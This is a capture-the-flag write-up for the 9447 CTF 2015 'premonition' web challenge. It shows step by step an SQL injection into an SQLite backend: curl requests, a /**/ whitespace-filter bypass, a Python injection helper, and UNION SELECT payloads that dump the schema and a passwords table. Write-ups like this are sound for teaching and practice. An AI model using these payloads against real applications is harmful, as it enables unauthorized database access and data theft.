# 9447 CTF 2015 2015: premonition

**Category:** Web
**Points:** 140
**Solves:** 121
**Description:**

>  There's been some weird occurrences going on at our school. Teacher's answer questions as though they knew the answer in advance, test results being handed out before the test, and now a weird web form giving info about us. Can you find out what weird information is on it?
> 
> 
>  Find the page at <http://premonition-p8l05mpz.9447.plumbing:9447>


## Write-up

We got an angular.js app that fetches data via a REST API. We identified the following
valid URLs. 
```
curl "http://premonition-p8l05mpz.9447.plumbing:9447/
    /firstname" -d "firstname=X"
    /lastname" -d "lastname=X"
    /class" -d "class=X"
    /score" -d "score=0&ineq=>"
    /date_birth" -d "date_birth=0&ineq=>"
```
They all give back json data. To shorten the following curl commands:
```
url="http://premonition-p8l05mpz.9447.plumbing:9447/score"
```

We sent the following request, which returns us no results
```
$ curl "$url" -d "score=0&ineq=<"
[]
```
But if we put an extra `'` in there... something strange happens
```
$ curl "$url" -d  "score=0'&ineq=<"
[["Xavier", "Bohm", 95.0, "5A"], ["Mindi", "Cleaves", 94.0, "5J"], ["Ingeborg", "Dunham", 93.0, "5D"], ["Layne", "Agrawal", 94.0, "5K"], ["Kai", "Nathanson", 94.0, "5A"], ["Catharine", "Mcnally", 92.0, "5J"], ["Jeromy", "Duncanson", 92.0, "5D"], ["Lewis", "Oglesbee", 93.0, "5K"], ["Terri", "Colombo", 94.0, "5A"], ["Geraldo", "Penson", 93.0, "5J"], ["Rachael", "Ackermann", 92.0, "5D"], ["Winford", "Hendley", 93.0, "5K"], ["Nella", "Avila", 95.0, "5A"], ["Albertine", "Walmsley", 91.0, "5J"], ["Tyson", "Jefferies", 93.0, "5D"], ["Beulah", "Kaba", 95.0, "5K"], ["Kendra", "Fettig", 94.0, "5A"], ["Kathie", "Bieker", 94.0, "5J"], ["Sharon", "Martelli", 93.0, "5D"], ["Eusebio", "Champagne", 92.0, "5K"], ["Roni", "Neuberger", 93.0, "5A"], ["Kristopher", "Haber", 92.0, "5J"], ["Rubin", "Puryear", 94.0, "5D"], ["Edwina", "June", 95.0, "5K"], ["Imogene", "Burmeister", 91.0, "5A"], ["Jonell", "Dark", 95.0, "5J"], ["Awilda", "Oler", 95.0, "5D"], ["Delbert", "Heminger", 92.0, "5K"], ["Marina", "Lombardi", 93.0, "5A"], ["Katharyn", "Veselka", 92.0, "5J"]]
```
OK so maybe we have some kind of injection vulnerability in the database backend.
Next we tried the `ineq` parameter:
```
$ curl "$url" -d "score=0'&ineq=x"
{"user": "sqliteadmin@localhost", "error": "near \"x\": syntax error"}
```
Oh how nice it seems to be sqlite in the background. And apparently the inequality
operator is just inserted into the raw statement. The score parameter on the other
hand seems to be bound using `?`, like in prepared statements.
```
$ curl "$url" -d "score=95&ineq=<>--x"
```
Gives us an error but 
```
$ curl "$url" -d "score=95&ineq=<>?--x"
```
works just fine. We can also see that whitespace are filtered. So we cannot do something like
```
$ curl "$url" -d "score=100&ineq=>? or 1=1--x"
```
which will result in an error. But then I remebered a neat trick about how to bypass this common
restriction using C-style comments:
```
$ curl "$url" -d "score=100&ineq=>?/**/or/**/1=1--x"
[["Xavier", "Bohm", 95.0, "5A"], ["Mindi", "Cleaves", 94.0, "5J"],  ....
```
Yay we get a list of all students :D So we have a full blown SQL injection.
To make things easier I created a small python function for doing the injections:
```
def inject(x):
    x = x.replace(" ", "/**/")
    print("Injecting: '{}'".format(x))
    resp = requests.post("http://premonition-p8l05mpz.9447.plumbing:9447/score",
                         data={"score": 100, "ineq": x})
    return resp.content
```
Note that `score > 100` will not any results, so we won't get any results from the normal
part of the query.

First thing we managed to dump the schema of the sqlite database:
```
schema = inject(">? union select name, sql, 0, name from sqlite_master--x")
print("got schema:")
schema = json.loads(schema)
for x in schema:
    print("table", x[0], "created with:\n", x[1])
```
We get the following output:
```
Injecting: '>?/**/union/**/select/**/name,/**/sql,/**/0,/**/name/**/from/**/sqlite_master--x'
got schema:
table s3ekr17_passwords created with:
 CREATE TABLE s3ekr17_passwords(
	userid real,
	password text
)
table students created with:
 CREATE TABLE students(
	userid real,
	firstname text,
	lastname text,
	score real,
	teacher real,
	class text,
	date_birth date,
	date_death date
)
```

So the flag is probably in the `s3ekr17_passwords` table. We can just get the contents using
a union select. Turns out each of the passwords of the users was a part of the flag and the
userid was the position of the character. So we just appended an `order by` and joined the
flag by parsing the json output.
```
x = inject(">? union select password, password, userid, password from s3ekr17_passwords order by userid--x")
print(x)
data = json.loads(x)
flag = "".join(x[0] for x in data)
print("the flag is:")
print(flag)
```
We get the following output:
```
Injecting: '>?/**/union/**/select/**/password,/**/password,/**/userid,/**/password/**/from/**/s3ekr17_passwords/**/order/**/by/**/userid--x'
[["9", "9", 0.0, "9"], ["4", "4", 1.0, "4"], ["4", "4", 2.0, "4"], ["7", "7", 3.0, "7"], ["{", "{", 4.0, "{"], ["u", "u", 5.0, "u"], ["S", "S", 6.0, "S"], ["e", "e", 7.0, "e"], ["r", "r", 8.0, "r"], ["A", "A", 9.0, "A"], ["g", "g", 10.0, "g"], ["e", "e", 11.0, "e"], ["n", "n", 12.0, "n"], ["T", "T", 13.0, "T"], ["s", "s", 14.0, "s"], ["_", "_", 15.0, "_"], ["a", "a", 16.0, "a"], ["N", "N", 17.0, "N"], ["d", "d", 18.0, "d"], ["_", "_", 19.0, "_"], ["s", "s", 20.0, "s"], ["p", "p", 21.0, "p"], ["a", "a", 22.0, "a"], ["C", "C", 23.0, "C"], ["e", "e", 24.0, "e"], ["s", "s", 25.0, "s"], ["_", "_", 26.0, "_"], ["a", "a", 27.0, "a"], ["R", "R", 28.0, "R"], ["e", "e", 29.0, "e"], ["_", "_", 30.0, "_"], ["p", "p", 31.0, "p"], ["e", "e", 32.0, "e"], ["a", "a", 33.0, "a"], ["s", "s", 34.0, "s"], ["A", "A", 35.0, "A"], ["n", "n", 36.0, "n"], ["t", "t", 37.0, "t"], ["_", "_", 38.0, "_"], ["R", "R", 39.0, "R"], ["a", "a", 40.0, "a"], ["c", "c", 41.0, "c"], ["E", "E", 42.0, "E"], ["s", "s", 43.0, "s"], ["}", "}", 44.0, "}"]]

the flag is:
9447{uSerAgenTs_aNd_spaCes_aRe_peasAnt_RacEs}
````

## Other write-ups and resources

* <http://mumei.strangled.net/post/3> (spanish)
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web140-premonition>
* <https://asciinema.org/a/30878>
* <http://secgroup.github.io/2015/11/30/9447ctf2015-writeup-premonition/>
* <http://pastebin.com/NCSv5qpW>
* <https://wiki.inpt.fr/ctf:public:9447:premonition>
